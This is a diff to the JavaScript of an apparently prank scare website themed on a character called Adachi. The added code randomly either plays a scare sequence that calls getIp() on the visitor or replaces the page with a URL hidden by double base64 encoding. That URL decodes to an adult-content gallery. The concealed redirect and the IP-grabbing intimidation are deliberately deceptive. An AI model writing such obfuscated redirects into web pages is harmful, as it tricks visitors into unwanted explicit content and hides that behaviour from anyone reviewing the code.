@@ -38,12 +38,16 @@
                 document.getElementById("true").className = "adachi3"
             }, 450)
             setTimeout(() => {
-                document.body.style.background = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(\"./img/falsedachi.png\")"
-                document.getElementById("wee").innerHTML = "adachi seems to fucking hate you."
-                document.getElementById("true").src = "./img/falsedachi.png"
-                audio.src = "./sfx/Scary.mp3"
-                audio.play()
-                getIp();
+                if (Math.random()*100 < 50) {
+                    document.body.style.background = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(\"./img/falsedachi.png\")"
+                    document.getElementById("wee").innerHTML = "adachi seems to fucking hate you."
+                    document.getElementById("true").src = "./img/falsedachi.png"
+                    audio.src = "./sfx/Scary.mp3"
+                    audio.play()
+                    getIp();
+                } else {
+                    window.location.replace(atob(atob("YUhSMGNITTZMeTl1YUdWdWRHRnBMbTVsZEM5bkx6UTFPREEzTkM4PQ==")))
+                }
             }, 10000)
             setTimeout(() => {
                 window.location.replace("https://tohruadachi84.github.io/AdachiSite/videos/adachgaming.mp4")
